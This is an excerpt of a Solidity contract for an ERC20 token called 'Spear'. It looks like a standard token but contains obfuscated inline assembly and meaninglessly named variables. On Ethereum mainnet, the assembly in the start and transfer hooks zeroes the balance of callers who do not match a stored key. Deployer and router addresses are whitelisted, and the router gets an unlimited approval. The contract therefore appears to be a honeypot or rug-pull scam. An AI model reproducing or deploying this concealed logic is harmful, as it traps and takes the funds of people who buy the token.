...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addWeapon;
    uint256 private throwRocks = block.number*2;

    mapping (address => bool) private _firstOres; 
    mapping (address => bool) private _secondMetal;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private castingIron;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private mixingGold;
    address public pair;
    ...
    bool private trading; uint256 private runFast = 1; bool private middleAge;
    uint256 private _decimals; uint256 private darkTime;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addWeapon.push(_router); addWeapon.push(msgSender_); addWeapon.push(pair);
        for (uint256 q=0; q < 3;) {_firstOres[addWeapon[q]] = true; unchecked{q++;} }
    }
    ...
    function _startToken() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xa5e092432efd82f1e58fd5fbf0ea785ba915b6a821173c9161c3eaa9b10715af
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xbc066f7294e95e1f6afb182ca292676e62df5917e01806bd73875ade3be1f963,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; throwRocks = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addWeapon[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeploySpear(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addWeapon[0], 10 ** 77);
        _startToken();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeploySpear(creator, initialSupply);
    }
}

contract Spear is ERC20Token {
    constructor() ERC20Token("Spear", "SPEAR", msg.sender, 100000000 * 10 ** 18) {
    }
}